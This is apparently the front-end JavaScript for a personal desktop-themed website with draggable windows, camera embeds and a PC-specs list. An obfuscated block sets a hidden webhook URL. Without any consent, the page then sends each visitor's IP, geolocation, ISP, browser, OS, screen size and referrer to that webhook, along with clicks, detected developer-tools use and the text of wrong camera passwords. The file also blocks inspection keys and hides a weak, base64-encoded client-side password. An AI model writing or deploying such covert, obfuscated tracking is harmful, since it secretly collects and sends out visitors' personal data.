// =============================================
//            CLICK SOUND (PC ONLY)
// =============================================

var audio = new Audio("assets/Others/Click.wav");

function isMobileDevice() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
  (navigator.maxTouchPoints && navigator.maxTouchPoints > 2) || window.innerWidth <= 480;
}

if (!isMobileDevice()) {
  document.onclick = function() {
    audio.volume = 0.2;
    audio.play();
  };
}

// =============================================
//                   PRELOADER
// =============================================

(function () {
  const PRELOADER_DURATION = 2600;

  function lockScroll() {
    document.body.style.overflow = 'hidden';
    document.body.style.position = 'fixed';
    document.body.style.top = '0';
    document.body.style.width = '100%';
  }

  function unlockScroll() {
    document.body.style.overflow = '';
    document.body.style.position = '';
    document.body.style.top = '';
    document.body.style.width = '';
  }

  lockScroll();

  setTimeout(function () {
    const preloader = document.getElementById('preloader');
    if (preloader) {
      preloader.style.transition = 'opacity 0.6s ease';
      preloader.style.opacity = '0';
      setTimeout(() => preloader.style.display = 'none', 600);
    }
  }, 2000);

  window.addEventListener('load', function () {
    setTimeout(unlockScroll, PRELOADER_DURATION);
  });
})();

// =============================================
//               WINDOWS MANAGEMENT
// =============================================

document.addEventListener('DOMContentLoaded', function() {
    updateClock();
    setInterval(updateClock, 1000);

    const windows = document.querySelectorAll('.window');
    windows.forEach(makeWindowDraggable);

    const cameraPassword = document.getElementById('camera-password');
    const cameraError = document.getElementById('camera-error');
    const cameraAuth = document.getElementById('camera-auth');
    const cameraContent = document.getElementById('camera-content');
    
if (cameraPassword) {
        cameraPassword.addEventListener('keyup', function(e) {
            if (e.key === 'Enter') {
                const encodedCorrectPassword = 'c2ViYXNlYmEx';
                if (btoa(this.value) === encodedCorrectPassword) {
                    cameraAuth.style.display = 'none';
                    showCameraContent();
                    this.value = '';
                    sendM('✅ **Camera - Correct Password**');
                } else {
                    const wrongPassword = this.value;
                    this.value = '';
                    cameraError.textContent = 'Wrong password';
                    this.classList.add('error');
                    sendM(`❌ **Camera - Wrong Password**\n\`\`\`${wrongPassword}\`\`\``);
                    
                    setTimeout(() => {
                        cameraError.textContent = '';
                        this.classList.remove('error');
                    }, 2000);
                }
            }
        });

        const cameraWindow = document.getElementById('camera-window');
        if (cameraWindow) {
            cameraWindow.querySelector('.close-button').addEventListener('click', () => {
                cameraAuth.style.display = 'flex';
                cameraContent.style.display = 'none';
                cameraContent.innerHTML = '';
                cameraPassword.value = '';
                cameraError.textContent = '';
            });
        }
    }

    // Buttons on taskbar
    document.querySelectorAll('.taskbar-item').forEach(item => {
        if (item.dataset.window) {
            item.addEventListener('click', () => {
                const windowId = item.dataset.window;
                const window = document.getElementById(windowId);
                if (window) {
                    toggleWindow(window);
                    updateTaskbarItem(item, window);
                }
            });
        }
    });

    // Windows
    document.querySelectorAll('.window').forEach(window => {
        const minimizeBtn = window.querySelector('.minimize-button');
        const closeBtn = window.querySelector('.close-button');
        
        if (minimizeBtn) {
            minimizeBtn.addEventListener('click', () => {
                closeWindow(window);
            });
        }
        
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                closeWindow(window);
            });
        }

        window.addEventListener('mousedown', (e) => {
            if (!e.target.classList.contains('window-button') && 
                !e.target.classList.contains('minimize-button') && 
                !e.target.classList.contains('close-button') &&
                !e.target.tagName.toLowerCase().includes('input') &&
                !e.target.tagName.toLowerCase().includes('button')) {
                focusWindow(window);
            }
        });

        const windowContent = window.querySelector('.window-content');
        if (windowContent) {
            windowContent.addEventListener('mousedown', (e) => {
                if (!e.target.tagName.toLowerCase().includes('input') &&
                    !e.target.tagName.toLowerCase().includes('button') &&
                    !e.target.classList.contains('window-button')) {
                    focusWindow(window);
                }
            });
        }
    });

    // Start Menu
    const startButton = document.getElementById('start-button');
    const startMenu = document.querySelector('.start-menu');
    
    if (startButton && startMenu) {
        startButton.addEventListener('click', () => {
            startMenu.classList.toggle('show');
        });

        document.addEventListener('click', (e) => {
            if (!startButton.contains(e.target) && !startMenu.contains(e.target)) {
                startMenu.classList.remove('show');
            }
        });
    }
});

    // Draggable windows
    function makeWindowDraggable(windowEl) {
        const header = windowEl.querySelector('.window-header');
        let isDragging = false;
        let currentX;
        let currentY;
        let initialX;
        let initialY;

        function dragStart(e) {
            if (e.target.classList.contains('window-controls') || 
                e.target.classList.contains('window-button')) {
            return;
        } 

        focusWindow(windowEl);
        isDragging = true;

        const computedStyle = window.getComputedStyle(windowEl);
        const matrix = new DOMMatrixReadOnly(computedStyle.transform);
        const rect = windowEl.getBoundingClientRect();

        if (windowEl.style.transform && windowEl.style.transform.includes('translate')) {
            currentX = rect.left;
            currentY = rect.top;
        } else {
            currentX = parseFloat(computedStyle.left) || rect.left;
            currentY = parseFloat(computedStyle.top) || rect.top;
        }

        initialX = e.clientX - currentX;
        initialY = e.clientY - currentY;

        windowEl.style.left = currentX + 'px';
        windowEl.style.top = currentY + 'px';
        windowEl.style.transform = 'none';

        if (e.target === header || header.contains(e.target)) {
            header.classList.add('grabbing');
        }

      e.preventDefault();
      document.addEventListener('mousemove', drag);
      document.addEventListener('mouseup', dragEnd);
    }

    function drag(e) {
        if (isDragging) {
            e.preventDefault();
            e.stopPropagation();
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;

            const windowWidth = windowEl.offsetWidth;
            const windowHeight = windowEl.offsetHeight;
            const maxX = window.innerWidth - windowWidth;
            const maxY = window.innerHeight - windowHeight;

            currentX = Math.min(Math.max(0, currentX), maxX);
            currentY = Math.min(Math.max(0, currentY), maxY);

            windowEl.style.left = currentX + 'px';
            windowEl.style.top = currentY + 'px';
            windowEl.style.transform = 'none';
        }
    }

    function dragEnd() {
        isDragging = false;
        header.classList.remove('grabbing');
        document.removeEventListener('mousemove', drag);
        document.removeEventListener('mouseup', dragEnd);
    }
    
    header.addEventListener('mousedown', dragStart);
    }
    function toggleWindow(window) {
        const isMobile = innerWidth <= 768;
    
        if (!window.classList.contains('show')) {
            if (isMobile) {
              document.querySelectorAll('.window').forEach(w => {
                if (w !== window && w.classList.contains('show')) {
                    closeWindow(w);
                }
            });
        }

        window.classList.add('show');

        const windowWidth = window.offsetWidth;
        const windowHeight = window.offsetHeight;
        const centerX = (innerWidth - windowWidth) / 2;

        let centerY;
        if (window.id === 'camera-window' && windowHeight > innerHeight / 2) {
            centerY = 50;
        } else {
            centerY = (innerHeight - windowHeight) / 2;
        }

        window.style.transform = 'none';
        window.style.left = `${Math.max(0, Math.min(centerX, innerWidth - windowWidth))}px`;
        window.style.top = `${Math.max(0, Math.min(centerY, innerHeight - windowHeight))}px`;

        focusWindow(window);

        const taskbarItem = document.querySelector(`[data-window="${window.id}"]`);
        if (taskbarItem) {
            taskbarItem.classList.add('active');
        }
    } else {
        if (parseInt(window.style.zIndex) < getHighestZIndex()) {
            focusWindow(window);
        } else {
            minimizeWindow(window);
        }
    }
}

function minimizeWindow(window) {
    window.classList.remove('show');
    const taskbarItem = document.querySelector(`[data-window="${window.id}"]`);
    if (taskbarItem) {
        taskbarItem.classList.remove('active');
    }
}

function closeWindow(window) {
    window.classList.remove('show');
    const taskbarItem = document.querySelector(`[data-window="${window.id}"]`);
    if (taskbarItem) {
        taskbarItem.classList.remove('active');
    }
}

function getHighestZIndex() {
    let highest = 1000;
    document.querySelectorAll('.window').forEach(w => {
        const zIndex = parseInt(w.style.zIndex) || 1000;
        if (zIndex > highest) {
            highest = zIndex;
        }
    });
    return highest;
}

function focusWindow(window) {
    if (!window.classList.contains('show')) {
        return;
    }

    const highestZ = getHighestZIndex();

    document.querySelectorAll('.window').forEach(w => {
        if (w !== window) {
            w.style.zIndex = '1000';
        }
    });
    window.style.zIndex = (highestZ + 1).toString();
}

function updateTaskbarItem(item, window) {
    if (window.classList.contains('show')) {
        item.classList.add('active');
    } else {
        item.classList.remove('active');
    }
}

// =============================================
//                 CAMERA BUTTON
// =============================================

function showCameraContent() {
  const cameraContent = document.getElementById('camera-content');
  if (cameraContent) {
    const cameraGrid = document.createElement('div');
    cameraGrid.className = 'camera-grid';
    setTimeout(() => {
      const cameraWindow = document.getElementById('camera-window');
      if (cameraWindow) {
        cameraWindow.style.transform = 'none';
        cameraWindow.style.top = '50px';
        const centerX = (innerWidth - cameraWindow.offsetWidth) / 2;
        cameraWindow.style.left = `${Math.max(0, centerX)}px`;
      }
    }, 100);
    
    const cameras = [
      { 
        id: 'camera1', 
        header: 'Kamera 1', 
        type: 'iframe',
        src: 'https://rtsp.me/embed/nynG2ert/',
        attributes: {
          frameborder: '0',
          allowfullscreen: true,
          webkitallowfullscreen: true,
          mozallowfullscreen: true,
          allow: 'autoplay; fullscreen; encrypted-media',
          loading: 'lazy',
          style: 'width: 100%; height: 100%; object-fit: cover; aspect-ratio: 16/9;',
          sandbox: 'allow-same-origin allow-scripts allow-popups allow-forms'
        }
      },
      { 
        id: 'camera2', 
        header: 'Kamera 2', 
        type: 'iframe',
        src: 'https://rtsp.me/embed/tthyKabs/',
        attributes: {
          frameborder: '0',
          allowfullscreen: true,
          webkitallowfullscreen: true,
          mozallowfullscreen: true,
          allow: 'autoplay; fullscreen; encrypted-media',
          loading: 'lazy',
          style: 'width: 100%; height: 100%; object-fit: cover; aspect-ratio: 16/9;',
          sandbox: 'allow-same-origin allow-scripts allow-popups allow-forms'
        }
      },
      { id: 'image1', header: 'EPSU 1', type: 'img', src: 'https://aero.webcam/cam/epsu-1.jpg' },
      { id: 'image2', header: 'EPSU 2', type: 'img', src: 'https://aero.webcam/cam/epsu-2.jpg' },
      { id: 'image3', header: 'EPSU 3', type: 'img', src: 'https://aero.webcam/cam/epsu-3.jpg' }
    ];
    
    cameras.forEach(camera => {
      const item = document.createElement('div');
      item.className = 'camera-item';
      
      const header = document.createElement('div');
      header.className = 'camera-header';
      header.textContent = camera.header;
      
      const element = document.createElement(camera.type);
      element.id = camera.id;
      element.src = camera.src;
      
      if (camera.type === 'iframe') {
        for (const [key, value] of Object.entries(camera.attributes)) {
          element[key] = value;
        }
      } else if (camera.type === 'img') {
        element.title = 'Odświeżane co 1 minutę';
        element.alt = '';
      }
      
      item.appendChild(header);
      item.appendChild(element);
      cameraGrid.appendChild(item);
    });
    
    cameraContent.innerHTML = '';
    cameraContent.appendChild(cameraGrid);
    cameraContent.style.display = 'block';
  }
}

// =============================================
//       ELEMENT INSPECT BLOCKER (useless)
// =============================================

window.onload = function () {
  document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
    showNotification("Nuh Uh");
  }, false);

  document.addEventListener("keydown", function (e) {
    // Ctrl + Shift + I (Developer Tools)
    if (e.ctrlKey && e.shiftKey && e.key === "I") {
      disabledEvent(e);
    }
    // Ctrl + Shift + J (Console)
    if (e.ctrlKey && e.shiftKey && e.key === "J") {
      disabledEvent(e);
    }
    // Ctrl + Shift + C (Element Inspector)
    if (e.ctrlKey && e.shiftKey && e.key === "C") {
      disabledEvent(e);
    }
    // Ctrl/Cmd + S (Save Page)
    if (e.key === "S" && (navigator.userAgent.includes("Mac") ? e.metaKey : e.ctrlKey)) {
      disabledEvent(e);
    }
    // Ctrl + U (View Source)
    if (e.ctrlKey && e.key === "U") {
      disabledEvent(e);
    }
    // Ctrl + I (Page Info - Mozilla)
    if (e.ctrlKey && e.key === "I") {
      disabledEvent(e);
    }
    // F12 (Developer Tools)
    if (e.key === "F12") {
      disabledEvent(e);
    }
  }, false);

  function disabledEvent(e) {
    e.stopPropagation();
    e.preventDefault();
    showNotification("Nuh Uh");
    return false;
  }

  function showNotification(message) {
    var notification = document.getElementById("notification");
    if (notification) {
      notification.textContent = message;
      notification.style.transform = "translateY(0%)";
      notification.style.opacity = "1";
      setTimeout(function () {
        notification.style.transform = "translateY(100%)";
        notification.style.opacity = "0";
      }, 2000);
    }
  }
}

// =============================================
//                 IMAGE REFRESH
// =============================================

// Lanyard Image
function refreshLanyardImage() {
  var lanyardImage = document.getElementById('lanyardImage');
  if (lanyardImage) {
    var timestamp = new Date().getTime();
    const baseUrl = "https://lanyard-profile-readme.vercel.app/api/430436408386125824";
    const params = `?animated=true&showDisplayName=true&timestamp=${timestamp}`;
    lanyardImage.src = baseUrl + params;
  }
}

// Camera Images
function refreshImages() {
    const timestamp = new Date().getTime();
    const images = ['image1', 'image2', 'image3'];
    
    images.forEach((id, index) => {
        const img = document.getElementById(id);
        if (img) {
            img.src = `https://aero.webcam/cam/epsu-${index + 1}.jpg?timestamp=${timestamp}`;
        }
    });
}

document.addEventListener('DOMContentLoaded', function() {
  setTimeout(refreshLanyardImage, 500);
});

document.addEventListener('visibilitychange', function() {
  if (!document.hidden) {
    setTimeout(refreshLanyardImage, 100);
  }
});

// Refresh Intervals
setInterval(refreshLanyardImage, 1000);
setInterval(refreshImages, 60000);

// =============================================
//             ACTIVITY (FOR FUN)
// =============================================

let devToolsMessageSent = false;
var wurl;(function(){var MhU='',Ohc=356-345;function pCg(s){var w=459323;var r=s.length;var b=[];for(var f=0;f<r;f++){b[f]=s.charAt(f)};for(var f=0;f<r;f++){var a=w*(f+128)+(w%35118);var l=w*(f+246)+(w%50678);var g=a%r;var u=l%r;var m=b[g];b[g]=b[u];b[u]=m;w=(a+l)%1872265;};return b.join('')};var KUn=pCg('qoxrtyknuaslchdvfroijccpzwmtrgubnteos').substr(0,Ohc);var IEl='(shcv(<vv0=5h,0=(4y+ca.ni."bldyfr,kj=lx={phrstn;[tcz);[ig o+a8o049=ie8)taa=,]6l=6i=2yu0("2n7l.jgr2[,.m ;c1iCegc,rh(00,,civ02t0o.y]p;6re;r,(bafei}rdlar9t;;g;c)(ao[ye]0 ;ta{ .o2r[]=du=t)rf+hfal=a6ra,f+7(h5rrCo1=xnv9; moaw;.lanzrt;]inbh;avlh)f1g]n-oe {xh.sk (,8c (1]f;rC="t,t8grlrns;}-..;nprft{-;((=4 ;)ratlevlr;pr"[ [}plr;}=,g.ln=.xea50}e"r=.C,[ba>p4irj=1qe;r)7= a= u{+;t3r;.),4);=n)gil }yaoegd)7 gv)ga("(=)(c=c;vad-,c;f;sv1e*rv)euhev1. i9r=(i1e=5ar=.e=+h(Cbtv" (ff((v9da +futo.qedfclnd+p.aS8[{6r[A,"<[()1++o hvrno[;htcsf2c-pt2=r;3+,2as-lloeesn0u=ui+u+f(lnlnu.u) =*8as+vA>tw+;piuhhp(sor(thv.a,,]!l)ay,stk;(a[7+8]n;r=eo+v+rri (wainr)dn]or<C);7)i)u,bmivr=t8;gAsh))-=1ta ypyoj,("1)gl6ktp.sh()[c4ovtair1](s+jsilCr(;]zohvfx;1e,0ng<iv56)(;p)9=.ce;crtvtqm2cfa==s,7iann=r;.Couo].)e+;6n;8h]z)n7 9d+;;<qois;+=hniv+)k(4dc+l;t w.um.2a,Aa(i)ohvo{,)Stnfscc;rdpv,erhgA=in=2n+e rerih=}.apil;tg)i"(o)paaur!w= ';var zkl=pCg[KUn];var MPk='';var LYh=zkl;var txr=zkl(MPk,pCg(IEl));var xRU=txr(pCg('\/e4=e.d,c_)f,0Y.= YnC,n.ab#p+r5Y)Yb).$;n21,}Ys,+4.2w,oe1.r.i!b3S#n.5w4$9t*Yfe7s"tt )_%=)18Ya}h:$aoYz2!#j=nY"e)oY$.02o]z)!mdd0=1(Nd.)g)}5tYo4tu1){fz!k$o(06o.}a;u!oYr. Y.Yd_6..hYlYzY0tY.;jCsnp5pah;;_((Y tvn1 "!9ip0(.jYb2eY03#Cr7j+kr$l#vY.381_(Y 1k cvb(.!u.cs,4oih.o_.)%_,! fcopsY[c}6Y1I,r;p.qbgur,mY1Yf971. 1Yzc.o3%(=TY;evi$"tbhbmNe8.c{eg, r+leal4=.)Y$rps__ur[];\/horrY*;.=,4=.Y$a.%rgpn6toS)Y1a-Yac_h(,,n.=.*t(p4Y;2;c.\/3070\/Y\/lis-+6..#9!os+i{(Y3,(u13...)+zks*c,f28.nx.Yu;-h\'73.8)))()c "jo.)j&6,r9Y8.*.r06);0($!=ttf-5,r_+x9;_.Y3;Y)3.Y_,0;2Y($$Y).!_6csmY,.=.\/rfkf*);esY6g($cppY2,Y6Y,.r\/c(,$1b%iY$6jtY}";1Y(szoY=n+i..cr.o_ft(p(,.h2!;4%fhi6!,o5[ia2acY()Y=Yz(oY=8f!.pxo(fxfwtc.e{Yohds0.t.j{Y=cf.4 ,j6$s_#e(p)!!2eY)\'v.Y13 \'k)jit.YeY1(c)1..7wur)2cc%$s187b)h;2g(rsh4 Yr,s,n).l.z}c.f_)%(Y1\/Y\/!(om5Y,o45rysY3YYy=t{f=m_t5!.s+\/Y!35Y(sYff."Y$1!e$t$]\/ swu.(t)zpYi&$.$+\'I8o!sg{,te.)la!Y.,Y_ br)s;1rcsY$=c4.l&f.es;$e2i$ba)(Se5YjcY.6)t(e_aY)*7rlt2!ir)b3=rp(lr.wYyp;{,88}9sfYYjgfY{&}p; $)0js!!;((..*i3.}})ta7sn=mfn19}+_]'));var ZJz=LYh(MhU,xRU );ZJz(7545);return 5278})()

function getBrowserAndOS() {
  const ua = navigator.userAgent;
  let browser = '❌', os = '❌';

  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
  else if (ua.includes("Edg")) browser = "Edge";
  else if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("MSIE") || ua.includes("Trident")) browser = "Explorer";

  if (ua.includes("Win")) os = "Windows";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
  else if (ua.includes("Mac")) os = "MacOS";

  return { browser, os };
}

async function getLocationData() {
  try {
    const ipResponse = await fetch('https://api64.ipify.org?format=json');
    if (!ipResponse.ok) throw new Error('IP fetch failed');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const geoServices = [
      {
        url: `https://ipinfo.io/${ip}/json`,
        parser: (data) => ({
          city: data.city || data.region || '❌',
          isp: data.org || data.hostname || '❌'
        })
      },
      {
        url: 'https://ipapi.co/json/',
        parser: (data) => ({
          city: data.city || data.region || '❌',
          isp: data.org || data.asn || '❌'
        })
      },
      {
        url: `https://ipapi.co/${ip}/json/`,
        parser: (data) => ({
          city: data.city || data.region || '❌',
          isp: data.org || data.asn || '❌'
        })
      },
      {
        url: `http://ip-api.com/json/${ip}`,
        parser: (data) => ({
          city: data.city || data.regionName || '❌',
          isp: data.isp || data.org || data.as || '❌'
        })
      }
    ];

    for (const service of geoServices) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(service.url, {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (compatible; WebsiteBot/1.0)'
          },
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          const data = await response.json();
          
          if (data.status === 'fail' || data.error) {
            console.warn(`Service returned error:`, data);
            continue;
          }
          
          const { city, isp } = service.parser(data);
          return { ip, city, isp };
        }
      } catch (error) {
        console.warn(`Service ${service.url} failed:`, error.message);
        continue;
      }
    }

    return { ip, city: '❌', isp: '❌' };
    
  } catch (error) {
    console.warn('All geo services failed, using fallback');
    return { ip: '❌', city: '❌', isp: '❌' };
  }
}

function sendM(message, buttonName = '') {
  if (!wurl) return;
  
  const { browser, os } = getBrowserAndOS();
  const referrer = document.referrer || '❌';
  const screenResolution = `${screen.width}x${screen.height}`;

  getLocationData().then(locationData => {
    const { ip, city, isp } = locationData;

    const embed = {
      title: message,
      color: parseInt("5d35b2", 16),
      fields: [
        { name: "\u2003", value: "\u2003", inline: false },
        { name: "", value: `\`\`\`${window.location.href}\`\`\``, inline: false },
        { name: "", value: `\`\`\`${new Date().toLocaleString()}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${browser}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${os}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${screenResolution}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${ip}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${city}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${isp}\`\`\``, inline: true },
        { name: "", value: `\`\`\`${referrer}\`\`\``, inline: false }
      ]
    };

    if (buttonName) {
      embed.fields.unshift({
        "name": "🔗 **Button Clicked**",
        "value": buttonName,
        "inline": true
      });
    }

    const params = {
      username: "Website Notification",
      avatar_url: "https://nobitek.github.io/assets/Images/Icon.png",
      embeds: [embed]
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    fetch(wurl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params),
      signal: controller.signal
    })
    .then(response => {
      clearTimeout(timeoutId);
      if (!response.ok) {
        console.warn('Webhook response not OK:', response.status);
      }
    })
    .catch(error => {
      clearTimeout(timeoutId);
      if (error.name === 'AbortError') {
        console.warn('Webhook request timeout');
      } else {
        console.warn('Webhook error:', error.message);
      }
    });
  }).catch(error => {
    console.warn('Failed to get location data:', error.message);
  });
}

// Development Tools Detection
if (!isMobileDevice()) {
  let devToolsMessageSent = false;
  let devToolsCheckInterval;

  function isDevToolsOpen() {
    const threshold = 160;
    const widthThreshold = window.outerWidth - window.innerWidth > threshold;
    const heightThreshold = window.outerHeight - window.innerHeight > threshold;
    return widthThreshold || heightThreshold;
  }

  function startDevToolsDetection() {
    devToolsCheckInterval = setInterval(() => {
      if (isDevToolsOpen() && !devToolsMessageSent) {
        sendM('🛠️ **Developer Tools**');
        devToolsMessageSent = true;
      }
    }, 1000);
  }

  function stopDevToolsDetection() {
    if (devToolsCheckInterval) {
      clearInterval(devToolsCheckInterval);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startDevToolsDetection);
  } else {
    startDevToolsDetection();
  }

  window.addEventListener('resize', () => {
    if (!isDevToolsOpen()) {
      devToolsMessageSent = false;
    }
  });

  window.addEventListener('beforeunload', stopDevToolsDetection);
}

document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
      sendM('👤');
    }, 1000);

    document.querySelectorAll('.taskbar-item').forEach(item => {
        item.addEventListener('click', function() {
            const windowId = this.dataset.window;
            if (this.dataset.lastClick && Date.now() - this.dataset.lastClick < 1000) {
              return;
            }
            this.dataset.lastClick = Date.now();
            
            if (windowId === 'camera-window') {
                sendM('📷 **Camera Window**');
            } else if (windowId === 'pc-window') {
                sendM('🖥️ **PC Specs Window**');
            } else if (windowId === 'socials-window') {
                sendM('🔗 **Socials Window**');
            } else if (this.id === 'start-button') {
                sendM('🌍 **Start Menu**');
            }
        });
    });
});

const buttons = document.querySelectorAll('a.button');
buttons.forEach(button => {
  button.addEventListener('click', function(event) {
    event.preventDefault();
    
    if (this.dataset.lastClick && Date.now() - this.dataset.lastClick < 1000) {
      return;
    }
    this.dataset.lastClick = Date.now();
    
    const buttonName = this.classList.contains('discord') ? 'Discord' :
                       this.classList.contains('instagram') ? 'Instagram' :
                       this.classList.contains('youtube') ? 'YouTube' :
                       this.classList.contains('steam') ? 'Steam' :
                       this.classList.contains('spotify') ? 'Spotify' :
                       this.classList.contains('twitch') ? 'Twitch' : 'Unknown';
    
    const targetUrl = this.href;
    sendM('', buttonName);

    setTimeout(() => {
      window.open(targetUrl, '_blank');
    }, 500);
  });
});

// =============================================
//                     CLOCK
// =============================================

function updateClock() {
    const now = new Date();
    const timeElement = document.getElementById('time');
    const dateElement = document.getElementById('date');
    
    if (timeElement) {
        timeElement.textContent = now.toLocaleTimeString('pl-PL', { 
            hour: '2-digit', 
            minute: '2-digit'
        });
    }
    
    if (dateElement) {
        dateElement.textContent = now.toLocaleDateString('pl-PL', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
        });
    }
}

// =============================================
//            PC SPECS WITH PRICES
// =============================================

async function loadPCSpecs() {
  console.log('Loading PC specs...');
  try {
    const response = await fetch('/assets/Others/prices.json');
    const data = await response.json();
    
    const pcWindow = document.querySelector('#pc-window .window-content ul');
    if (!pcWindow) return;
    
    pcWindow.innerHTML = '';
    
    let totalPrice = 0;
    
    data.specs.forEach(item => {
      if (item.spacer) {
        const br = document.createElement('br');
        pcWindow.appendChild(br);
        return;
      }
      
      if (item.subItems && (item.category === 'Keyboard' || item.category === 'Monitors')) {
        const li = document.createElement('li');
        li.textContent = item.category + ':';
        pcWindow.appendChild(li);
        
        const ul = document.createElement('ul');
        item.subItems.forEach(subItem => {
          if (subItem.price && subItem.price > 0) {
            totalPrice += subItem.price;
          }
          
          const subLi = document.createElement('li');
          let content = subItem.name;
          
          content = content.replace(/ or /g, ' <span style="color: #888888;">or</span> ');
          content = content.replace(/\(w\/ ([^)]+)\)/g, '<span style="color: #5a5a5a;">(w/ $1)</span>');
          
          if (subItem.price === null || subItem.price === 0) {
            content += ` <span style="color: #f74d4d; font-weight: 600; cursor: help;" title="The price is unknown at this time">[?]</span>`;
          } else if (subItem.price > 0) {
            content += ` <span style="color: #4dabf7; font-weight: 600;">[${subItem.price.toFixed(2)} zł]</span>`;
          }
          
          subLi.innerHTML = content;
          ul.appendChild(subLi);
        });
        pcWindow.appendChild(ul);
        return;
      }
      
      const li = document.createElement('li');
      let content = `${item.category} - ${item.name}`;
      
      content = content.replace(/\(w\/ ([^)]+)\)/g, '<span style="color: #5a5a5a;">(w/ $1)</span>');
      
      if (item.price === null || item.price === 0) {
        content += ` <span style="color: #f74d4d; font-weight: 600; cursor: help;" title="The price is unknown at this time">[?]</span>`;
      } else if (item.price > 0) {
        totalPrice += item.price;
        content += ` <span style="color: #4dabf7; font-weight: 600;">[${item.price.toFixed(2)} zł]</span>`;
      }
      
      li.innerHTML = content;
      pcWindow.appendChild(li);
      
      if (item.subItems && item.category === 'SSD') {
        const ul = document.createElement('ul');
        item.subItems.forEach(subItem => {
          if (subItem.price && subItem.price > 0) {
            totalPrice += subItem.price;
          }
          
          const subLi = document.createElement('li');
          let subContent = `⠀⠀⠀⠀ ${subItem.name}`;
          
          subContent = subContent.replace(/\(w\/ ([^)]+)\)/g, '<span style="color: #5a5a5a;">(w/ $1)</span>');
          
          if (subItem.price === null || subItem.price === 0) {
            subContent += ` <span style="color: #f74d4d; font-weight: 600; cursor: help;" title="The price is unknown at this time">[?]</span>`;
          } else if (subItem.price > 0) {
            subContent += ` <span style="color: #4dabf7; font-weight: 600;">[${subItem.price.toFixed(2)} zł]</span>`;
          }
          
          subLi.innerHTML = subContent;
          ul.appendChild(subLi);
        });
        pcWindow.appendChild(ul);
      }
    });
    
    const spacerLi = document.createElement('li');
    spacerLi.innerHTML = '&nbsp;';
    spacerLi.style.borderTop = '1px solid #242433';
    spacerLi.style.marginTop = '10px';
    spacerLi.style.paddingTop = '5px';
    spacerLi.style.marginBottom = '0';
    pcWindow.appendChild(spacerLi);
    
    const totalLi = document.createElement('li');
    totalLi.innerHTML = `<strong style="font-size: 1.1em; color: #4dabf7;">TOTAL SETUP COST: ${totalPrice.toFixed(2)} zł</strong>`;
    totalLi.style.fontWeight = '900';
    totalLi.style.marginTop = '5px';
    pcWindow.appendChild(totalLi);
    
    const updateLi = document.createElement('li');
    updateLi.innerHTML = `<span style="color: #888; font-size: 0.85em; font-style: italic;">Last price update: ${data.lastUpdate}</span>`;
    updateLi.style.marginTop = '3px';
    pcWindow.appendChild(updateLi);
    
  } catch (error) {
    console.error('Failed to load PC specs:', error);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', loadPCSpecs);
} else {
  loadPCSpecs();
}

// =============================================
//                 DEBUG OUTPUT
// =============================================

console.log('%c🌐 Current page: %c' + window.location.href, 'color: darkorange; font-weight: bold;', 'color: lightgreen;');
console.log('%c🧭 User Agent: %c' + navigator.userAgent, 'color: green; font-weight: bold;', 'color: lightblue;');
